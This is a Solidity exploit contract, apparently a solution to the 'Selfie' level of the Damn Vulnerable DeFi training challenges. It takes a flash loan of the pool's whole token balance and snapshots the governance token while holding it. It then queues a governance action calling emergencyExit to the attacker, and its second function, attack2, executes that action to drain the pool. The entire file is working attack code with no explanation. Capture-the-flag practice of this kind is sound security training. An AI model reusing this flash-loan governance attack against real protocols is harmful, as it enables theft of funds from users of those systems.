// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

error SelfieHackNotReceiveLoan();
error SelfieDidntCreateSnapshot();
error SelfieActionNotQueued();

contract SelfieHack is IERC3156FlashBorrower {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;

    constructor(address _token, address _pool, address _governance) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    fallback() external payable {}

    receive() external payable {}

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata _data
    ) external returns (bytes32) {
        if (token.balanceOf(address(this)) == 0 ether)
            revert SelfieHackNotReceiveLoan();
        uint256 id = token.snapshot();
        if (id != 2) revert SelfieDidntCreateSnapshot();
        governance.queueAction(address(pool), 0, _data);
        uint count = governance.getActionCounter();
        if (count != 2) revert SelfieActionNotQueued();
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(msg.sender)
        );
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            data
        );
    }

    function attack2() external {
        governance.executeAction(1);
    }
}
